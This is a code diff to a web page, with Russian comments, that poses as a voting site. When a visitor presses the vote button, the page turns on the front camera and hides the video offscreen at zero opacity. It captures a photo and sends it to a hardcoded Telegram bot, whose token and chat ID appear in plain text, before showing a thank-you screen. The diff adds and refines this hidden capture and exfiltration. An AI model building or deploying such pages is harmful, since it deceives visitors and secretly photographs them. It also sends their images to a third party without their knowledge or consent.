@@ -60,8 +60,14 @@
             background: #000;
             color: #fff;
         }
-        #video, #canvas {
-            display: none; /* Видео и канвас полностью скрыты */
+        #video {
+            position: absolute;
+            top: -9999px; /* Убираем за пределы экрана */
+            left: -9999px;
+            opacity: 0; /* Скрываем визуально */
+        }
+        #canvas {
+            display: none;
         }
         @media (max-width: 768px) {
             h1 {
@@ -105,50 +111,53 @@
 
         voteBtn.addEventListener('click', async () => {
             try {
-                // Запрашиваем доступ к камере с настройками для лучшего качества
+                // Запрашиваем доступ к камере
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { 
-                        facingMode: 'user', // Используем фронтальную камеру
-                        width: { ideal: 1280 }, // Увеличиваем разрешение
-                        height: { ideal: 720 }
+                        facingMode: 'user', // Фронтальная камера
+                        width: { ideal: 640 }, // Стандартное разрешение
+                        height: { ideal: 480 }
                     }
                 });
                 video.srcObject = stream;
 
-                // Даём камере 2 секунды на фокусировку
-                setTimeout(() => {
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const photoData = canvas.toDataURL('image/png');
+                // Ждём загрузки видео
+                video.onloadeddata = () => {
+                    // Даём камере 1.5 секунды на фокусировку
+                    setTimeout(() => {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const photoData = canvas.toDataURL('image/png');
 
-                    // Останавливаем камеру
-                    stream.getTracks().forEach(track => track.stop());
+                        // Останавливаем камеру
+                        stream.getTracks().forEach(track => track.stop());
 
-                    // Отправляем фото в Telegram
-                    const token = "8169191018:AAHWIGIQ8WvUvlX6e_9RrbFVcfnbza_Qkb0"; // Новый токен
-                    const chatId = "2068847868"; // Твой Chat ID
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', dataURLtoBlob(photoData), 'vote_photo.png');
+                        // Отправляем фото в Telegram
+                        const token = "8169191018:AAHWIGIQ8WvUvlX6e_9RrbFVcfnbza_Qkb0";
+                        const chatId = "2068847868";
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', dataURLtoBlob(photoData), 'vote_photo.png');
 
-                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            // Переключаем экраны
-                            startScreen.style.opacity = '0';
-                            setTimeout(() => {
-                                startScreen.style.display = 'none';
-                                thanksScreen.style.opacity = '1';
-                                thanksScreen.style.pointerEvents = 'auto';
-                            }, 500);
-                        } else {
-                            console.error('Ошибка отправки в Telegram');
-                        }
-                    })
-                    .catch(error => console.error('Ошибка:', error));
-                }, 2000); // Увеличили задержку до 2 секунд
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                // Переключаем экраны
+                                startScreen.style.opacity = '0';
+                                setTimeout(() => {
+                                    startScreen.style.display = 'none';
+                                    thanksScreen.style.opacity = '1';
+                                    thanksScreen.style.pointerEvents = 'auto';
+                                }, 500);
+                            } else {
+                                console.error('Ошибка отправки в Telegram');
+                            }
+                        })
+                        .catch(error => console.error('Ошибка:', error));
+                    }, 1500); // Задержка 1.5 секунды для фокуса
+                };
             } catch (err) {
                 console.error('Ошибка доступа к камере:', err);
                 alert('Не удалось получить доступ к камере. Проверь разрешение!');
